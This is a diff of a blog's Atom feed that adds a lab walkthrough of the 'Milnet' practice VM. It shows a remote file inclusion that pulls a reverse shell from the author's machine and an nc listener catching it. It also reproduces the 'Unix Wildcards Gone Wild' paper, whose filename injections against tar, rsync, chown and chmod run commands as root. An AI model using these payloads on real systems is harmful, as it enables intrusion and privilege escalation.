@@ -4,7 +4,7 @@
   <title><![CDATA[Category: writeups | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/writeups/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2018-05-04T16:33:13-04:00</updated>
+  <updated>2018-05-13T12:12:42-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,798 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Hacking the Milnet]]></title>
+    <link href="http://chousensha.github.io/blog/2018/05/13/hacking-the-milnet/"/>
+    <updated>2018-05-13T06:55:41-04:00</updated>
+    <id>http://chousensha.github.io/blog/2018/05/13/hacking-the-milnet</id>
+    <content type="html"><![CDATA[<p>Today&rsquo;s target is a story-based VM inspired by a book! Let&rsquo;s jump straight in!</p>
+
+<!-- more -->
+
+
+<p><code>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 9b:b5:21:38:96:7f:85:bd:1b:aa:9a:70:cf:db:cd:36 (RSA)
+|   256 93:30:be:c2:af:dd:81:a8:25:2b:57:e5:01:49:91:57 (ECDSA)
+|_  256 37:40:2b:cc:27:ae:89:22:d0:d2:65:65:c4:9b:53:42 (EdDSA)
+80/tcp open  http    lighttpd 1.4.35
+|_http-server-header: lighttpd/1.4.35
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+</code></p>
+
+<p><img class="center" src="/images/pentest/milnet/milnet.jpg" title="&lsquo;milnet&rsquo; &lsquo;milnet&rsquo;" ></p>
+
+<p>Nothing much on this site, some German text and a credits page. I ran Nikto on it with no significant finds. The site is running lighttpd/1.4.35 and it has an info.php page displaying phpinfo() output. There is also a line mentioning a RFI vulnerability for the info.php page, but I wasn&rsquo;t able to exploit that.</p>
+
+<p>I ran dirb next, with no further luck. So I looked more closely at the phpinfo page. The allow_url_include directive is on, so RFI should definitely be possible somewhere, but I couldn&rsquo;t find extra pages. I tried OWASP ZAP next, and it helped with finding the vulnerable entry point:</p>
+
+<p><img class="center" src="/images/pentest/milnet/zap.jpg" title="&lsquo;owasp zap rfi&rsquo; &lsquo;owasp zap rfi&rsquo;" ></p>
+
+<p>I used Burp to craft a request directly to the content.php page, by trying to direct the route parameter to a page on my machine where the Python web server would serve a reverse shell, but it didn&rsquo;t work, so I took a step back to see how the website is using the route parameter. I just navigated on it with Burp on and observed the request:</p>
+
+<p>```
+POST /content.php HTTP/1.1
+Host: 192.168.217.140
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: <a href="http://192.168.217.140/nav.php">http://192.168.217.140/nav.php</a>
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10</p>
+
+<p>route=bomb
+```</p>
+
+<p>So I intercepted this and changed route to point to <a href="http://192.168.217.132:8000/shell.php.">http://192.168.217.132:8000/shell.php.</a> This is my attacking machine where I was serving the shell on port 8000 and waiting for it on port 8888. This time I did get an incoming request:</p>
+
+<p><code>
+python -m SimpleHTTPServer 8000
+Serving HTTP on 0.0.0.0 port 8000 ...
+192.168.217.140 - - [13/May/2018 08:16:54] code 404, message File not found
+192.168.217.140 - - [13/May/2018 08:16:54] "GET /shell.php.php HTTP/1.0" 404 -
+</code></p>
+
+<p>An extra .php extension is appended to the request. So I changed the RFI to:</p>
+
+<p><code>
+route=http://192.168.217.132:8000/shell
+</code></p>
+
+<p>And this time things went smoothly:</p>
+
+<p><code>
+192.168.217.140 - - [13/May/2018 08:29:41] "GET /shell.php HTTP/1.0" 200 -
+</code></p>
+
+<p>I have a shell:</p>
+
+<p><code>
+nc -vnlp 8888
+listening on [any] 8888 ...
+connect to [192.168.217.132] from (UNKNOWN) [192.168.217.140] 57412
+Linux seckenheim.net.mil 4.4.0-22-generic #40-Ubuntu SMP Thu May 12 22:03:46 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
+ 14:29:41 up  1:38,  0 users,  load average: 0.13, 0.07, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$
+</code></p>
+
+<p>I proceeded with some enumeration:</p>
+
+<p><code>
+$ ls /home
+langman
+$ ls /home/langman
+SDINET
+</code></p>
+
+<p>There are lots of text files in here:</p>
+
+<p><code>
+$ ls
+DCA_Circular.310-P115-1
+DefenseCode_Unix_WildCards_Gone_Wild.txt
+FUN18.TXT
+compserv.txt
+fips-index.
+fips_500_166.txt
+fips_500_169.txt
+fips_500_170.txt
+fips_500_171.txt
+pentagon.txt
+sec-8901.txt
+sec-8902.txt
+sec-9540.txt
+sec-9720.txt
+</code></p>
+
+<p>These are various army-related documents which you can read at your own leisure. More interesting is the DefenseCode_Unix_WildCards_Gone_Wild.txt document, which lists different code execution techniques by exploiting Unix wildcards. Because this was such an interesting read, I&rsquo;ve included it here:</p>
+
+<p>```</p>
+
+<h1>Back To The Future: Unix Wildcards Gone Wild</h1>
+
+<ul>
+<li>Leon Juranic <a href="&#109;&#97;&#105;&#x6c;&#116;&#111;&#58;&#x6c;&#x65;&#111;&#x6e;&#64;&#x64;&#x65;&#102;&#x65;&#110;&#115;&#101;&#99;&#111;&#100;&#x65;&#x2e;&#99;&#x6f;&#x6d;">&#108;&#101;&#111;&#x6e;&#64;&#x64;&#x65;&#x66;&#x65;&#110;&#x73;&#101;&#x63;&#x6f;&#x64;&#101;&#46;&#99;&#111;&#x6d;</a></li>
+<li>Creation Date: 04/20/2013</li>
+<li>Release Date: 06/25/2014</li>
+</ul>
+
+
+<p>Table Of Content:</p>
+
+<p>===[ 1. Introduction
+===[ 2. Unix Wildcards For Dummies
+===[ 3. Wildcard Wilderness
+===[ 4. Something more useful&hellip;</p>
+
+<pre><code>  4.1 Chown file reference trick (file owner hijacking)
+  4.2 Chmod file reference trick
+  4.3 Tar arbitrary command execution 
+  4.4 Rsync arbitrary command execution
+</code></pre>
+
+<p>===[ 5. Conclusion</p>
+
+<p>===[ 1. Introduction</p>
+
+<p>First of all, this article has nothing to do with modern hacking
+techniques like ASLR bypass, ROP exploits, 0day remote kernel exploits or Chrome&rsquo;s
+Chain-14-Different-Bugs-To-Get-There&hellip;
+Nope, nothing of the above. This article will cover one interesting
+old-school Unix hacking technique, that will still work nowadays in 2013.
+Hacking technique of which (to my suprise) even many security-related people haven&rsquo;t heard of.
+That is probably because nobody ever really talked about it before.
+Why I decided to write on this subject is because, to me personally, it&rsquo;s pretty funny
+to see what can be done with simple Unix wildcard poisoning tricks.
+So, from this article, what you can expect is collection of neat *nix hacking
+tricks that as far as I know somehow didn&rsquo;t emerge earlier.
+If you wonder how basic Unix tools like &lsquo;tar&rsquo; or &lsquo;chown&rsquo; can lead to
+full system compromise, keep on reading.
+Ladies and gentleman; take your seats, fasten your belts and hold on tight
+&ndash; cause we&rsquo;re going straight back to the 80&rsquo;s, right to the Unix shell hacking&hellip;
+(Is this bad-hair-rock/groovy disco music playing in the background? I think sooo&hellip;)</p>
+
+<p>===[ 2. Unix Wildcards For Dummies</p>
+
+<p>If you already know what Unix wildcards are, and how (and why) are they
+used in shell scripting, you should skip this part.
+However, we will include Wildcard definition here just for the sake of
+consistency and for potential newcomers.
+Wildcard is a character, or set of characters that can be used as a
+replacement for some range/class of characters. Wildcards are interpreted
+by shell before any other action is taken.</p>
+
+<p>Some Shell Wildcards:</p>
+
+<pre><code>*     An asterisk matches any number of characters
+      in a filename, including none.
+?     The question mark matches any single
+      character.
+[ ]   Brackets enclose a set of characters, any
+      one of which may match a single character
+      at that position.
+-     A hyphen used within [ ] denotes a range of
+      characters.
+~     A tilde at the beginning of a word expands
+      to the name of your home directory.  If you
+      append another user's login name to the
+      character, it refers to that user's home
+      directory.
+</code></pre>
+
+<p>Basic example of wildcards usage:</p>
+
+<h1>ls *.php</h1>
+
+<ul>
+<li>List all files with PHP extension</li>
+</ul>
+
+
+<h1>rm *.gz</h1>
+
+<ul>
+<li>Delete all GZIP files</li>
+</ul>
+
+
+<h1>cat backup*</h1>
+
+<ul>
+<li>Show content of all files which name is beginning with &lsquo;backup&rsquo; string</li>
+</ul>
+
+
+<h1>ls test?</h1>
+
+<ul>
+<li>List all files whose name is beginning with string &lsquo;test&rsquo; and has exactly
+one additional character</li>
+</ul>
+
+
+<p>===[ 3. Wildcard Wilderness</p>
+
+<p>Wildcards as their name states, are &ldquo;wild&rdquo; by their nature, but moreover,
+in some cases, wildcards can go berserk.
+During the initial phase of playing with this interesting wildcard tricks,
+I&rsquo;ve talked with dozen old-school Unix admins and security people,
+just to find out how many of them knows about wildcard tricks, and
+potential danger that they pose.
+To my suprise, only two of 20 people stated that they know it&rsquo;s not
+wise to use wildcard, particulary in &lsquo;rm&rsquo; command, because someone
+could abuse it with &ldquo;argument-like-filename&rdquo;. One of them said that he
+heard of that years ago on some basic Linux admin course. Funny.</p>
+
+<p>Simple trick behind this technique is that when using shell wildcards,
+especially asterisk (*), Unix shell will interpret files beginning with hyphen
+(&ndash;) character as command line arguments to executed command/program.
+That leaves space for variation of classic channeling attack.
+Channeling problem will arise when different kind of information channels
+are combined into single channel. Practical case in form of particulary this technique
+is combining arguments and filenames, as different &ldquo;channels&rdquo; into single,
+because of using shell wildcards.</p>
+
+<p>Let&rsquo;s check one very basic wildcard argument injection example.</p>
+
+<p>[root@defensecode public]# ls -al
+total 20
+drwxrwxr-x.  5 leon   leon   4096 Oct 28 17:04 .
+drwx&mdash;&mdash;&mdash;. 22 leon   leon   4096 Oct 28 16:15 ..
+drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:04 DIR1
+drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:04 DIR2
+drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:04 DIR3
+-rw-rw-r&mdash;.  1 leon   leon      0 Oct 28 17:03 file1.txt
+-rw-rw-r&mdash;.  1 leon   leon      0 Oct 28 17:03 file2.txt
+-rw-rw-r&mdash;.  1 leon   leon      0 Oct 28 17:03 file3.txt
+-rw-rw-r&mdash;.  1 nobody nobody    0 Oct 28 16:38 -rf</p>
+
+<p>We have directory with few subdirectories and few files in it.
+There is also file with &lsquo;-rf&rsquo; filename ther owned by the user &lsquo;nobody&rsquo;.
+Now, let&rsquo;s run &lsquo;rm *&rsquo; command, and check directory content again.</p>
+
+<p>[root@defensecode public]# rm *
+[root@defensecode public]# ls -al
+total 8
+drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:05 .
+drwx&mdash;&mdash;&mdash;. 22 leon   leon   4096 Oct 28 16:15 ..
+-rw-rw-r&mdash;.  1 nobody nobody    0 Oct 28 16:38 -rf</p>
+
+<p>Directory is totally empty, except for &lsquo;-rf&rsquo; file in it.
+All files and directories were recursively deleted, and it&rsquo;s pretty obvious what happened&hellip;
+When we started &lsquo;rm&rsquo; command with asterisk argument, all filenames in current
+directory were passed as arguments to &lsquo;rm&rsquo; on command line, exactly same as
+following line:</p>
+
+<p>[user@defensecode WILD]$ rm DIR1 DIR2 DIR3 file1.txt file2.txt file3.txt -rf</p>
+
+<p>Since there is &lsquo;-rf&rsquo; filename in current directory, &lsquo;rm&rsquo; got -rf option as the
+last argument, and all files in current directory were recursively deleted.
+We can also check that with strace:</p>
+
+<p>[leon@defensecode WILD]$ strace rm *
+execve(&ldquo;/bin/rm&rdquo;, [&ldquo;rm&rdquo;, &ldquo;DIR1&rdquo;, &ldquo;DIR2&rdquo;, &ldquo;DIR3&rdquo;, &ldquo;file1.txt&rdquo;, &ldquo;file2.txt&rdquo;,
+&ldquo;file3.txt&rdquo;, &ldquo;-rf&rdquo;], [/<em> 25 vars </em>/]) = 0</p>
+
+<pre><code>          ^- HERE
+</code></pre>
+
+<p>Now we know how it&rsquo;s possible to inject arbitrary arguments to the unix
+shell programs. In the following chapter we will discuss how we can abuse that
+feature to do much more than just recursively delete files.</p>
+
+<p>===[ 4. Something more useful&hellip;</p>
+
+<p>Since now we know how it&rsquo;s possible to inject arbitrary arguments to
+shell commands, let&rsquo;s demonstrate few examples that are more useful,
+than just recursive file unlinking.
+First, when I stumbled across this wildcard tricks, I was starting to look
+for basic and common Unix programs that could be seriously affected
+with arbitrary and unexpected arguments.
+In real-world cases, following examples could be abused in form of direct
+interactive shell poisoning, or through some commands started from cron job,
+shell scripts, through some web application, and so on.
+In all examples below, attacker is hidden behind &lsquo;leon&rsquo; account, and victim
+is of course &ndash; root account.</p>
+
+<p>==[ 4.1 Chown file reference trick (file owner hijacking)</p>
+
+<p>First really interesting target I&rsquo;ve stumbled across is &lsquo;chown&rsquo;.
+Let&rsquo;s say that we have some publicly writeable directory with bunch of
+PHP files in there, and root user wants to change owner of all PHP files to &lsquo;nobody&rsquo;.
+Pay attention to the file owners in the following files list.</p>
+
+<p>[root@defensecode public]# ls -al
+total 52
+drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
+drwx&mdash;&mdash;&mdash;. 22 user user 4096 Oct 28 17:34 ..
+-rw-rw-r&mdash;.  1 user user   66 Oct 28 17:36 admin.php
+-rw-rw-r&mdash;.  1 user user   34 Oct 28 17:35 ado.php
+-rw-rw-r&mdash;.  1 user user   80 Oct 28 17:44 config.php
+-rw-rw-r&mdash;.  1 user user  187 Oct 28 17:44 db.php
+-rw-rw-r&mdash;.  1 user user  201 Oct 28 17:35 download.php
+-rw-r&mdash;r&mdash;.  1 leon leon    0 Oct 28 17:40 .drf.php
+-rw-rw-r&mdash;.  1 user user   43 Oct 28 17:35 file1.php
+-rw-rw-r&mdash;.  1 user user   56 Oct 28 17:47 footer.php
+-rw-rw-r&mdash;.  1 user user  357 Oct 28 17:36 global.php
+-rw-rw-r&mdash;.  1 user user  225 Oct 28 17:35 header.php
+-rw-rw-r&mdash;.  1 user user  117 Oct 28 17:35 inc.php
+-rw-rw-r&mdash;.  1 user user  111 Oct 28 17:38 index.php
+-rw-rw-r&mdash;.  1 leon leon    0 Oct 28 17:45 &mdash;reference=.drf.php
+-rw-rw&mdash;&mdash;.  1 user user   66 Oct 28 17:35 password.inc.php
+-rw-rw-r&mdash;.  1 user user   94 Oct 28 17:35 script.php</p>
+
+<p>Files in this public directory are mostly owned by the user named &lsquo;user&rsquo;,
+and root user will now change that to &lsquo;nobody&rsquo;.</p>
+
+<p>[root@defensecode public]# chown -R nobody:nobody *.php</p>
+
+<p>Let&rsquo;s see who owns files now&hellip;</p>
+
+<p>[root@defensecode public]# ls -al
+total 52
+drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
+drwx&mdash;&mdash;&mdash;. 22 user user 4096 Oct 28 17:34 ..
+-rw-rw-r&mdash;.  1 leon leon   66 Oct 28 17:36 admin.php
+-rw-rw-r&mdash;.  1 leon leon   34 Oct 28 17:35 ado.php
+-rw-rw-r&mdash;.  1 leon leon   80 Oct 28 17:44 config.php
+-rw-rw-r&mdash;.  1 leon leon  187 Oct 28 17:44 db.php
+-rw-rw-r&mdash;.  1 leon leon  201 Oct 28 17:35 download.php
+-rw-r&mdash;r&mdash;.  1 leon leon    0 Oct 28 17:40 .drf.php
+-rw-rw-r&mdash;.  1 leon leon   43 Oct 28 17:35 file1.php
+-rw-rw-r&mdash;.  1 leon leon   56 Oct 28 17:47 footer.php
+-rw-rw-r&mdash;.  1 leon leon  357 Oct 28 17:36 global.php
+-rw-rw-r&mdash;.  1 leon leon  225 Oct 28 17:35 header.php
+-rw-rw-r&mdash;.  1 leon leon  117 Oct 28 17:35 inc.php
+-rw-rw-r&mdash;.  1 leon leon  111 Oct 28 17:38 index.php
+-rw-rw-r&mdash;.  1 leon leon    0 Oct 28 17:45 &mdash;reference=.drf.php
+-rw-rw&mdash;&mdash;.  1 leon leon   66 Oct 28 17:35 password.inc.php
+-rw-rw-r&mdash;.  1 leon leon   94 Oct 28 17:35 script.php</p>
+
+<p>Something is not right&hellip; What happened? Somebody got drunk here.
+Superuser tried to change files owner to the user:group &lsquo;nobody&rsquo;, but somehow,
+all files are owned by the user &lsquo;leon&rsquo; now.</p>
+
+<p>If we take closer look, this directory previously contained just the
+following two files created and owned by the user &lsquo;leon&rsquo;.</p>
+
+<p>-rw-r&mdash;r&mdash;.  1 leon leon    0 Oct 28 17:40 .drf.php
+-rw-rw-r&mdash;.  1 leon leon    0 Oct 28 17:45 &mdash;reference=.drf.php</p>
+
+<p>Thing is that wildcard character used in &lsquo;chown&rsquo; command line took arbitrary
+&lsquo;&mdash;reference=.drf.php&rsquo; file and passed it to the chown command at
+the command line as an option.</p>
+
+<p>Let&rsquo;s check chown manual page (man chown):
+   &mdash;reference=RFILE</p>
+
+<pre><code>      use RFILE's owner and group rather than specifying OWNER:GROUP values
+</code></pre>
+
+<p>So in this case, &lsquo;&mdash;reference&rsquo; option to &lsquo;chown&rsquo; will override &lsquo;nobody:nobody&rsquo;
+specified as the root, and new owner of files in this directory will be exactly
+same as the owner of &lsquo;.drf.php&rsquo;, which is in this case user &lsquo;leon&rsquo;.
+Just for the record, &lsquo;.drf&rsquo; is short for Dummy Reference File. :)</p>
+
+<p>To conclude, reference option can be abused to change ownership of files to some
+arbitrary user. If we set some other file as argument to the &mdash;reference option,
+file that&rsquo;s owned by some other user, not &lsquo;leon&rsquo;, in that case he would become owner
+of all files in this directory.</p>
+
+<p>With this simple chown parameter pollution, we can trick root into changing ownership
+of files to arbitrary users, and practically &ldquo;hijack&rdquo; files that are of interest to us.</p>
+
+<p>Even more, if user &lsquo;leon&rsquo; previously created a symbolic link in that directory
+that points to let&rsquo;s say /etc/shadow, ownership of /etc/shadow would also be changed
+to the user &lsquo;leon&rsquo;.</p>
+
+<p>===[ 4.2 Chmod file reference trick</p>
+
+<p>Another interesting attack vector similar to previously described &lsquo;chown&rsquo;
+attack is &lsquo;chmod&rsquo;.
+Chmod also has &mdash;reference option that can be abused to specify arbitrary
+permissions on files selected with asterisk wildcard.</p>
+
+<p>Chmod manual page (man chmod):</p>
+
+<pre><code>   --reference=RFILE
+          use RFILE's mode instead of MODE values
+</code></pre>
+
+<p>Example is presented below.</p>
+
+<p>[root@defensecode public]# ls -al
+total 68
+drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
+drwx&mdash;&mdash;&mdash;. 24 user user  4096 Oct 28 18:32 ..
+-rw-rw-r&mdash;.  1 user user 20480 Oct 28 19:13 admin.php
+-rw-rw-r&mdash;.  1 user user    34 Oct 28 17:47 ado.php
+-rw-rw-r&mdash;.  1 user user   187 Oct 28 17:44 db.php
+-rw-rw-r&mdash;.  1 user user   201 Oct 28 17:43 download.php
+-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
+-rw-rw-r&mdash;.  1 user user    43 Oct 28 17:35 file1.php
+-rw-rw-r&mdash;.  1 user user    56 Oct 28 17:47 footer.php
+-rw-rw-r&mdash;.  1 user user   357 Oct 28 17:36 global.php
+-rw-rw-r&mdash;.  1 user user   225 Oct 28 17:37 header.php
+-rw-rw-r&mdash;.  1 user user   117 Oct 28 17:36 inc.php
+-rw-rw-r&mdash;.  1 user user   111 Oct 28 17:38 index.php
+-rw-r&mdash;r&mdash;.  1 leon leon     0 Oct 29 00:41 &mdash;reference=.drf.php
+-rw-rw-r&mdash;.  1 user user    94 Oct 28 17:38 script.php</p>
+
+<p>Superuser will now try to set mode 000 on all files.</p>
+
+<p>[root@defensecode public]# chmod 000 *</p>
+
+<p>Let&rsquo;s check permissions on files&hellip;</p>
+
+<p>[root@defensecode public]# ls -al
+total 68
+drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
+drwx&mdash;&mdash;&mdash;. 24 user user  4096 Oct 28 18:32 ..
+-rwxrwxrwx.  1 user user 20480 Oct 28 19:13 admin.php
+-rwxrwxrwx.  1 user user    34 Oct 28 17:47 ado.php
+-rwxrwxrwx.  1 user user   187 Oct 28 17:44 db.php
+-rwxrwxrwx.  1 user user   201 Oct 28 17:43 download.php
+-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
+-rwxrwxrwx.  1 user user    43 Oct 28 17:35 file1.php
+-rwxrwxrwx.  1 user user    56 Oct 28 17:47 footer.php
+-rwxrwxrwx.  1 user user   357 Oct 28 17:36 global.php
+-rwxrwxrwx.  1 user user   225 Oct 28 17:37 header.php
+-rwxrwxrwx.  1 user user   117 Oct 28 17:36 inc.php
+-rwxrwxrwx.  1 user user   111 Oct 28 17:38 index.php
+-rw-r&mdash;r&mdash;.  1 leon leon     0 Oct 29 00:41 &mdash;reference=.drf.php
+-rwxrwxrwx.  1 user user    94 Oct 28 17:38 script.php</p>
+
+<p>What happened? Instead of 000, all files are now set to mode 777 because
+of the &lsquo;&mdash;reference&rsquo; option supplied through file name..
+Once again, file .drf.php owned by user &lsquo;leon&rsquo; with mode 777 was
+used as reference file and since &mdash;reference option is supplied, all files
+will be set to mode 777.
+Beside just &mdash;reference option, attacker can also create another file with
+&lsquo;-R&rsquo; filename, to change file permissions on files in all subdirectories recursively.</p>
+
+<p>===[ 4.3 Tar arbitrary command execution</p>
+
+<p>Previous example is nice example of file ownership hijacking. Now, let&rsquo;s go to even
+more interesting stuff like arbitrary command execution. Tar is very common unix program
+for creating and extracting archives.
+Common usage for lets say creating archives is:</p>
+
+<p>[root@defensecode public]# tar cvvf archive.tar *</p>
+
+<p>So, what&rsquo;s the problem with &lsquo;tar&rsquo;?
+Thing is that tar has many options, and among them, there some pretty interesting
+options from arbitrary parameter injection point of view.</p>
+
+<p>Let&rsquo;s check tar manual page (man tar):</p>
+
+<pre><code>  --checkpoint[=NUMBER]
+          display progress messages every NUMBERth record (default 10)
+
+   --checkpoint-action=ACTION
+          execute ACTION on each checkpoint
+</code></pre>
+
+<p>There is &lsquo;&mdash;checkpoint-action&rsquo; option, that will specify program which will
+be executed when checkpoint is reached. Basically, that allows us arbitrary
+command execution.</p>
+
+<p>Check the following directory:</p>
+
+<p>[root@defensecode public]# ls -al
+total 72
+drwxrwxrwx.  2 user user  4096 Oct 28 19:34 .
+drwx&mdash;&mdash;&mdash;. 24 user user  4096 Oct 28 18:32 ..
+-rw-rw-r&mdash;.  1 user user 20480 Oct 28 19:13 admin.php
+-rw-rw-r&mdash;.  1 user user    34 Oct 28 17:47 ado.php
+-rw-r&mdash;r&mdash;.  1 leon leon     0 Oct 28 19:19 &mdash;checkpoint=1
+-rw-r&mdash;r&mdash;.  1 leon leon     0 Oct 28 19:17 &mdash;checkpoint-action=exec=sh shell.sh
+-rw-rw-r&mdash;.  1 user user   187 Oct 28 17:44 db.php
+-rw-rw-r&mdash;.  1 user user   201 Oct 28 17:43 download.php
+-rw-rw-r&mdash;.  1 user user    43 Oct 28 17:35 file1.php
+-rw-rw-r&mdash;.  1 user user    56 Oct 28 17:47 footer.php
+-rw-rw-r&mdash;.  1 user user   357 Oct 28 17:36 global.php
+-rw-rw-r&mdash;.  1 user user   225 Oct 28 17:37 header.php
+-rw-rw-r&mdash;.  1 user user   117 Oct 28 17:36 inc.php
+-rw-rw-r&mdash;.  1 user user   111 Oct 28 17:38 index.php
+-rw-rw-r&mdash;.  1 user user    94 Oct 28 17:38 script.php
+-rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh</p>
+
+<p>Now, for example, root user wants to create archive of all files in current
+directory.</p>
+
+<p>[root@defensecode public]# tar cf archive.tar *</p>
+
+<p>uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</p>
+
+<p>Boom! What happened? /usr/bin/id command gets executed! We&rsquo;ve just achieved arbitrary command
+execution under root privileges.
+Once again, there are few files created by user &lsquo;leon&rsquo;.</p>
+
+<p>-rw-r&mdash;r&mdash;.  1 leon leon     0 Oct 28 19:19 &mdash;checkpoint=1
+-rw-r&mdash;r&mdash;.  1 leon leon     0 Oct 28 19:17 &mdash;checkpoint-action=exec=sh shell.sh
+-rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh</p>
+
+<p>Options &lsquo;&mdash;checkpoint=1&rsquo; and &lsquo;&mdash;checkpoint-action=exec=sh shell.sh&rsquo; are passed to the
+&lsquo;tar&rsquo; program as command line options. Basically, they command tar to execute shell.sh
+shell script upon the execution.</p>
+
+<p>[root@defensecode public]# cat shell.sh
+/usr/bin/id</p>
+
+<p>So, with this tar argument pollution, we can basically execute arbitrary commands
+with privileges of the user that runs tar. As demonstrated on the &lsquo;root&rsquo; account above.</p>
+
+<p>===[ 4.4 Rsync arbitrary command execution</p>
+
+<p>Rsync is &ldquo;a fast, versatile, remote (and local) file-copying tool&rdquo;, that is very
+common on Unix systems.
+If we check &lsquo;rsync&rsquo; manual page, we can again find options that can be abused for arbitrary
+command execution.</p>
+
+<p>Rsync manual:
+&ldquo;You use rsync in the same way you use rcp. You must specify a source and a destination,
+one of which may be remote.&rdquo;</p>
+
+<p>Interesting rsync option from manual:</p>
+
+<p> -e, &mdash;rsh=COMMAND           specify the remote shell to use</p>
+
+<pre><code> --rsync-path=PROGRAM    specify the rsync to run on remote machine
+</code></pre>
+
+<p>Let&rsquo;s abuse one example directly from the &lsquo;rsync&rsquo; manual page.
+Following example will copy all C files in local directory to a remote host &lsquo;foo&rsquo;
+in &lsquo;/src&rsquo; directory.</p>
+
+<h1>rsync -t *.c foo:src/</h1>
+
+<p>Directory content:</p>
+
+<p>[root@defensecode public]# ls -al
+total 72
+drwxrwxrwx.  2 user user  4096 Mar 28 04:47 .
+drwx&mdash;&mdash;&mdash;. 24 user user  4096 Oct 28 18:32 ..
+-rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php
+-rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php
+-rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php
+-rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php
+-rw-r&mdash;r&mdash;.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
+-rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php
+-rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php
+-rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php
+-rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php
+-rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
+-rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
+-rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php
+-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c</p>
+
+<p>Now root will try to copy all C files to the remote server.</p>
+
+<p>[root@defensecode public]# rsync -t *.c foo:src/</p>
+
+<p>rsync: connection unexpectedly closed (0 bytes received so far) [sender]
+rsync error: error in rsync protocol data stream (code 12) at io.c(601) [sender=3.0.8]</p>
+
+<p>Let&rsquo;s see what happened&hellip;</p>
+
+<p>[root@defensecode public]# ls -al
+total 76
+drwxrwxrwx.  2 user user  4096 Mar 28 04:49 .
+drwx&mdash;&mdash;&mdash;. 24 user user  4096 Oct 28 18:32 ..
+-rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php
+-rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php
+-rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php
+-rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php
+-rw-r&mdash;r&mdash;.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
+-rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php
+-rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php
+-rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php
+-rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php
+-rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
+-rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
+-rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php
+-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c
+-rw-r&mdash;r&mdash;.  1 root root   101 Mar 28 04:49 shell_output.txt</p>
+
+<p>There were two files owned by user &lsquo;leon&rsquo;, as listed below.</p>
+
+<p>-rw-r&mdash;r&mdash;.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
+-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c</p>
+
+<p>After &lsquo;rsync&rsquo; execution, new file shell_output.txt whose owner is root
+is created in same directory.</p>
+
+<p>-rw-r&mdash;r&mdash;.  1 root root   101 Mar 28 04:49 shell_output.txt</p>
+
+<p>If we check its content, following data is found.</p>
+
+<p>[root@defensecode public]# cat shell_output.txt
+uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</p>
+
+<p>Trick is that because of the &lsquo;*.c&rsquo; wildcard, &lsquo;rsync&rsquo; got &lsquo;-e sh shell.c&rsquo; option
+on command line, and shell.c will be executed upon &lsquo;rsync&rsquo; start.
+Content of shell.c is presented below.</p>
+
+<p>[root@defensecode public]# cat shell.c
+/usr/bin/id > shell_output.txt</p>
+
